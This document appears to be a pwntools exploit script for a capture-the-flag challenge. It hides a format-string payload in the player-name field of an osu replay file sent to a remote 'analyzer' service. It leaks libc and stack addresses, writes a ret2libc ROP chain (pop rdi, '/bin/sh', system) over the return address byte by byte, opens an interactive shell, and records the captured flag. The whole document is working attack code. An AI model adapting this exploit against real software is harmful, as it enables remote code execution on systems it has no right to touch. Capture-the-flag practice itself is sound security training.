from pwn import *
context.log_level = 'info'
import shutil
shutil.copyfile('code016hiro1901 playing Rocket Start - Sushi Blast (Shmiklak) [Normal] (2024-03-02_20-14).osr', "temp")
import subprocess

e = context.binary = ELF('./analyzer', checksec=False)
libc = ELF('libc.so.6')

# lib = e.libc
# r= e.process()

r= remote("chal.osugaming.lol", 7273)
  
def getoutput():
    output = subprocess.check_output(['xxd', '-p', '-c0', 'temp.txt'])
    output = output.decode('utf8')
    output = output.replace('\n', '')
    return output.encode()

def setup_payload(fmt_str, write_stack):
    with open('temp', 'rb') as f_input:
        text = f_input.read() 
        modified_text = text.replace(b'code016hiro1901', fmt_str.ljust(15, b"\x00"))
        modified_text = modified_text.replace(b'317233ec6c79498a79e36712804078ce', write_stack)
        with open('temp.txt', 'wb') as f_output:
            f_output.write(modified_text)   

exit_got=0x404070

setup_payload(b':%51$p%6$p%85$p', flat(b"a"*32))

payload = getoutput()

pause()
r.sendline(payload)
r.recvuntil(b":0x")

leak= int(r.recv(12),16)
base_libc= leak - 0x2cd90
info(f"base_libc: {hex(base_libc)}")

r.recvuntil(b"0x")
overwrite = int(r.recv(12),16)
info(f"overwrite: {hex(overwrite)}")

retn = overwrite - 272

system_libc = base_libc + 0x7fd5b5b26d70-0x7fd5b5ad3000
binsh_libc = base_libc + 0x7fd5b5cae678-0x7fd5b5ad3000
pop_rdi_ret = base_libc+0x00007f1bc0f2b3e5-0x7f1bc0efe000
ret = pop_rdi_ret+1
log.info("retn: %#x" %retn)

log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)
log.info("pop_rdi_ret: %#x" %pop_rdi_ret)

def write_addr_1byte(value, retn):
    for i in range(6):
        fmt = f"%{value&0xff}c%17$hhn".encode().ljust(15,b"\x00" )
        print(b"payload: "+ fmt)
        info(f"retn: {hex(retn)}")
        info(f"value: {hex(value&0xff)}")
        setup_payload(fmt, flat(b"a"*24, retn))
        payload= getoutput()
        r.sendline(payload)
        if(value !=0):
            value = value >> 8
        retn+=1  

def write_addr(value, retn):
    for i in range(3):
        fmt =f"%{value&0xffff}c%17$hn".encode().ljust(15,b"\x00" )
        print(b"payload: "+ fmt)
        info(f"retn: {hex(retn)}")
        setup_payload(fmt, flat(b"a"*24, retn))
        payload= getoutput()
        r.sendline(payload)
        value = value >> 16
        retn+=2  

pause()
write_addr_1byte(ret, retn)
retn+=8
write_addr_1byte(pop_rdi_ret, retn)
retn+=8
write_addr_1byte(binsh_libc, retn)
retn+=8
write_addr_1byte(system_libc, retn)

# setup_payload(b"a", b"a")
# payload= getoutput()
# gdb.attach(r, 
    # f"""b*{retn}
    # n
    # """)
    
pause()
r.sendline(b"3")

r.interactive()

# osu{1_h4te_c!!!!!!!!}